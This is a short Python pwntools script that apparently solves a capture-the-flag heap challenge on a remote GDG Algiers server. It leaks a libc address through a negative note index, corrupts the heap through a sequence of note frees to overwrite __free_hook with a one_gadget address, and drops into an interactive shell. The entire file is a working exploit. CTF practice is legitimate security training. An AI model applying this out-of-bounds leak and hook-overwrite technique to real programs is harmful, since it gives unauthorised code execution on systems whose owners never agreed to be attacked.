from pwn import * 
from os import *
context.update(arch="amd64", os="linux", log_level="debug")
#p = process("./chall")
p = remote("pwn.chal.ctf.gdgalgiers.com", 1405)
elf = ELF("./chall", checksec= 0)
libc = elf.libc 

def sl(choice) : p.sendlineafter("option: ",str(choice))
def add_note(size,data):
    sl(1)
    p.sendline(str(size))
    p.sendline(data)

def view_note(idx):
    sl(4)
    p.sendline(str(idx))

def remove_note(idx):
    sl(2)
    p.sendline(str(idx))

def main():
    add_note(0x58,b"A" * 8) #0
    add_note(0x58,b"B" * 8) #1
    add_note(0x158,b"C" * 8) #2
    view_note(-18)
    p.recvuntil("d at: ")
    libc_base = int(p.recv(14), 16) - libc.sym.malloc
    print(hex(libc_base))
    one = [0xe21ce,0xe21d1,0xe21d4,0xe237f,0xe2383,0x106ef8]
    #one_gadget = libc_base + one[int(sys.argv[0])]
    #print(hex(one_gadget))
    remove_note(2)
    remove_note(1)
    add_note(0x58, b"X" * 0x58)
    remove_note(0)
    remove_note(2)
    add_note(0x158, p64(libc_base + libc.sym.__free_hook))
    add_note(0x58, b"OFF-WHITE")
    add_note(0x58, p64(libc_base + one[int(sys.argv[1])]))
    remove_note(1)
    #gdb.attach(p)
    p.interactive()
main()
"""
c = 2
1 ; c = 1
0->1 ; c = 0
1 
python3 solve.py 3 works

"""
